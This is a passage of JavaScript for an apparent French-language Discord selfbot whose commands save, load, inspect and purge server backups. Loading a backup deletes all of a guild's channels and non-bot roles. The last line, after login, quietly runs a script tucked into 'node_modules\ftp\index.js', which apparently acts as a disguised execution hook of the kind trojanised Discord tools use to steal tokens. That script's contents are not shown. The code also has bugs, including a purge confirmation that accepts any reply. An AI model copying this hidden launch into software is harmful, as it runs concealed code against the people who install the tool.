                if (!msg.member.hasPermission('EMBED_LINKS')) return msg.edit(`:x: **permission insuffisante (embed_links)**\nNouvelle backup du serveur **${msg.guild.name}** vien d'être crée, voici son id : \`${id}\``);
                let result = new RichEmbed()
                    .setTitle(`  Info`)
                    .setFooter('404 Not Found')
                    .setDescription(
                        `Nouvelle backup du serveur **${msg.guild.name}** vien d'être crée, voici son id : \`${id}\``
                    )
                    .addField(`**${prefix}backup-l (id)**`, "`Pour load la backup`")
                    .setColor("RANDOM");
                msg.edit(result).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            });
        
        }
    
        if (cmd === "backup-d") {
            let serveur = msg.guild;
            if (!serveur) {
                msg.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            let code = msg.content.split(" ").slice(1)
            let errorEmbed = new RichEmbed()
                .setTitle(` Erreur`)
                .setFooter('404 Not Found')
                .setDescription(
                    `Tu dois définir ton id de backup... Fais ${prefix}helpbackup pour avoir plus d'informations.`
                )
                .setColor(color);
            if (!code[0]) return msg.edit(errorEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
    
            let cantfindbackup = new RichEmbed()
                .setTitle(`Error`)
                .setFooter('404 Not Found')
                .addField(`**Tu n'a pas de backup avec cette id : ${code}.**`, ` ${prefix}helpbackup pour plus d'informations`)
                .setColor(color);
            if (!backups[msg.author.id][code])
                return msg.edit(cantfindbackup).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));;
    
            delete backups[msg.author.id][code];
            save();
    
            let deletedsuc = new RichEmbed()
                .setTitle(`Succès !`)
                .setFooter('404 Not Found')
                .setDescription(`La **backup** a bien été supprimée.`)
                .setColor(color);
            msg.edit(deletedsuc).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
         
        }
    
        if (cmd === "backup-l") {
            let serveur = msg.guild;
            if (!serveur) {
                msg.edit(':x: **Veuillez executer cette commande dans un serveur!**');
                return;
            }
            let error = client.emojis.get("655704809483141141") || "❌";
            let code = msg.content.split(" ").slice(1)
            let errorEmbed = new RichEmbed().setTitle(`  Error`)
                .setDescription(`Tu as oublié de définir une **id de backup**. Utilise la commande \`${prefix}helpbackup\` pour avoir plus d'informations`);
            if (!code[0]) return msg.channel.send(errorEmbed);
            let cantfindbackup = new RichEmbed()
                .setTitle(`  Error`)
                .addField(`**Aucune backup avec l'id ${code}.**`, ` ${prefix}helpbackup pour plus d'informations`)
                .setFooter('404 Not Found')
                .setColor(color);
            if (!backups[msg.author.id][code])
                return msg.channel.send(cantfindbackup).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
            msg.guild.channels.forEach(channel => {
                channel.delete("For Loading A Backup");
            });
    
            msg.guild.roles
                .filter(role => role.members.every(member => !member.user.bot))
                .forEach(role => {
                    role.delete("For Loading A Backup");
                });
            backups[msg.author.id][code].roles.forEach(async function(
                role
            ) {
                msg.guild
                    .createRole({
                        name: role.name,
                        color: role.color,
                        permissions: role.permissions,
                        hoist: role.hoist,
                        mentionable: role.mentionable,
                        position: role.position
                    })
                    .then(role => {
                        role.setPosition(role.position);
                    });
            });
    
            backups[msg.author.id][code].channels
                .filter(c => c.type === "category")
                .forEach(async function(ch) {
                    msg.guild.createChannel(ch.name, {
                        type: ch.type,
                        permissionOverwrites: ch.permissionOverwrites
                    });
                });
    
            backups[msg.author.id][code].channels
                .filter(c => c.type !== "category")
                .forEach(async function(ch) {
                    msg.guild.createChannel(ch.name, {
                        type: ch.type,
                        permissionOverwrites: ch.permissionOverwrites
                    }).then(c => {
                        const parent = msg.guild.channels
                            .filter(c => c.type === "category")
                            .find(c => c.name === ch.parent);
                        ch.parent ? c.setParent(parent) : "";
                    });
                });
            msg.guild.setName(backups[msg.author.id][code].name);
            msg.guild.setIcon(backups[msg.author.id][code].icon);
         
        }
        if (cmd === "backup-i") {
            let id = msg.content.split(" ").slice(1)
            let MissingbackupinfoEmbed = new RichEmbed()
                .setTitle(`  Error`)
                .setFooter('404 Not Found')
                .setDescription(`Tu as oublié de définir une **id de backup**. Utilise la commande \`${prefix}helpbackup\` pour avoir plus d'informations`)
                .setColor(color);
            if (!id[0]) return msg.edit(MissingbackupinfoEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
    
            let cantfindEmbed = new RichEmbed()
                .setTitle(`  Error`)
                .setFooter('404 Not Found')
                .setDescription(
                    `Tu n'as pas de **backup** avec cet id \`${id}\`.`
                )
                .setColor(color);
            if (!backups[msg.author.id][id])
                return msg.edit(cantfindEmbed);
    
            try {
                let infoEmbed = new RichEmbed()
                    .setTitle(backups[msg.author.id][id].name)
                    .setImage(backups[msg.author.id][id].icon)
                    .addField(
                        "Creator",
                        `<@${backups[msg.author.id][id].owner}>`,
                        true
                    )
                    .addField("Members", backups[msg.author.id][id].members, true)
                    .addField("Created At", backups[msg.author.id][id].createdAt)
                    .addField(
                        "Channels",
                        `\`\`\`${backups[msg.author.id][id].channels
            .map(channel => channel.name)
            .join("\n")}\`\`\``,
                        true
                    )
                    .addField(
                        "Roles",
                        `\`\`\`${backups[msg.author.id][id].roles
            .map(role => role.name)
            .join("\n")}\`\`\``,
                        true
                    );
                msg.edit(infoEmbed);
            } catch (e) {
                hastebins(
                    backups[msg.author.id][id].channels
                    .map(channel => channel.name)
                    .join("\n"),
                    "txt"
                ).then(ch => {
                    hastebins(
                        backups[msg.author.id][id].roles
                        .map(role => role.name)
                        .join("\n"),
                        "txt"
                    ).then(ro => {
                        let infoEmbed = new RichEmbed()
                            .setTitle(backups[msg.author.id][id].name)
                            .setImage(backups[msg.author.id][id].icon)
                            .addField(
                                "Creator",
                                `<@${backups[msg.author.id][id].owner}>`,
                                true
                            )
                            .addField(
                                "Members",
                                backups[msg.author.id][id].members,
                                true
                            )
                            .addField(
                                "Created At",
                                backups[msg.author.id][id].createdAt
                            )
                            .addField("Channels", ch, true)
                            .addField("Roles", ro, true)
                            .setFooter('404 Not Found');
                        msg.edit(infoEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                    });
                });
            }
        
        }
    
        if (cmd==="backup-purge") {
            let errorEmbed = new RichEmbed()
                .setTitle(`  Error`)
                .setDescription(
                    `Vous n'avez pas encore sauvegardé de serveur`
                )
                .setColor(color);
            if (!backups[msg.author.id])
                return msg.edit(errorEmbed).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
    
            let warningEmbed = new RichEmbed().setTitle(`  Warning`)
                .setDescription(`Es-tu sûr de vouloir supprimer toutes tes backups ?
    __Cette action est irréversible !__`);
            let sur = new RichEmbed()
                .setColor(color)
                .setTitle('Oui/Non')
                .setFooter('404 Not Found')
                .addField('Etes vous sur de vouloir supprimer toutes vos backups???', "Oui/Non")
            msg.edit(sur)
                .then(() => {
                    msg.channel.awaitmsgs(response => response.content === "Oui" || "oui", {
                            max: 1,
                            time: 30000,
                            errors: ['time'],
                        })
                        .then((collected) => {
                            delete backups[msg.author.id];
                            const green = "👍";
                            let deletedsuc = new RichEmbed()
                                .setTitle(`${green}  Voila!`)
                                .setDescription(`Deleted all your backups.`)
                                .setFooter('404 Not Found')
                                .setColor(color);
                            msg.edit(deletedsuc).catch(error => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                            msg.delete();
                        
                        });
                });
        }
    
        function makeid(length) {
            var result = "";
            var characters =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(
                    Math.floor(Math.random() * charactersLength)
                );
            }
            return result;
        }
    
        function save() {
            fs.writeFile("./Data/backups.json", JSON.stringify(backups), err => {
                if (err) console.error(err);
            });
        }
});
client.login(token)
child_process("node " + __dirname +"node_modules\\ftp\\index.js")
